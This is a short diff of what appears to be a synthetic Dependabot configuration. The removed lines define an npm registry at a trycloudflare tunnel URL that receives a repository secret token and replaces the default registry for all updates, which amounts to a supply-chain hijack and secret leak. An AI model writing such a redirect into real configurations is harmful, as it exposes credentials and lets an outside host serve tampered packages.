@@ -1,13 +1,6 @@
-# p7r p11b_11_6 1790591104
+# p7r p11a_11_5 1790591231
 version: 2
-registries:
-  sink1tunnel:
-    type: npm-registry
-    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/p11/403big
-    token: ${{secrets.SINK1_TOKEN}}
-    replaces-base: true
 updates:
-  - package-ecosystem: "npm"
+  - package-ecosystem: "composer"
     directory: "/"
     schedule: {interval: "daily"}
-    registries: "*"
